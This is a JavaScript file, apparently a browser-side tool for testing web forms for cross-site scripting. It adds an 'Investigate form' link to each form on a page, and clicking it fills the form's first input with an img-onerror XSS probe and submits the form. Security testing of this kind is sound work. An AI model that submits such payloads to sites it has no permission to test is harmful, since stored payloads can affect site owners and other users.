var native_alert = alert;

alert = function(msg) {
  console.log("ALERTING");
  console.log('An alert was generated. Message: ' + msg);
  native_alert(msg);
}

function ignoreerror() {
  return true;
}

window.onerror = ignoreerror();

window.onload = function() {

  function ignoreerror()
  {
    return true
  }
  window.onerror=ignoreerror();

  // (function() {
  //   console.log("Do we get this far?");
  //   var _old_alert = window.alert;

  //   window.alert = function() {
  //     console.log("Not this far");
  //     console.log("ALERTING" + arguments);
  //     // document.body.innerHTML += "<br>alerting";
  //     _old_alert.apply(window,arguments);
  //     // document.body.innerHTML += "<br>done alerting<br>";
  //   };
  // })();


  var forms = document.getElementsByTagName("form");
  for (var i = 0; i < forms.length; i++) {
    var currForm = forms[i];
    var inputs = currForm.getElementsByTagName("input");
    if (!inputs.length)
      continue;
    var firstInputChild = inputs[0];
    // console.log("FIRST INPUT CHILD IS: " + firstInputChild);
    // firstInputChild.value = "HELLOOOOOOOOO" + i.toString();

    var recommendation = document.createElement('a');
    recommendation.classList.add("recommendation");
    var text = document.createTextNode("Investigate form");
    recommendation.appendChild(text);
    recommendation.setAttribute("href", "javascript:void(0)");

    recommendation.child = firstInputChild;
    recommendation.form = currForm;

    recommendation.addEventListener('click', function(evt) {
      alert('attempting XSS');
      attemptXSS(evt.target.child, evt.target.form);
    });

    var newParent = document.createElement("div");

    newParent.appendChild(firstInputChild);
    newParent.appendChild(recommendation);
    currForm.insertBefore(newParent, currForm.firstChild);
  }
}

function attemptXSS(inputElement, parentForm) {
  // var inputToFill = document.getElementById(inputElement);
  // inputToFill.value = "ASD";
  console.log(inputElement);
  console.log(parentForm);
  inputElement.value = "<img src=a onerror=\"alert('XSS HENLO')\">";
  parentForm.submit();
}













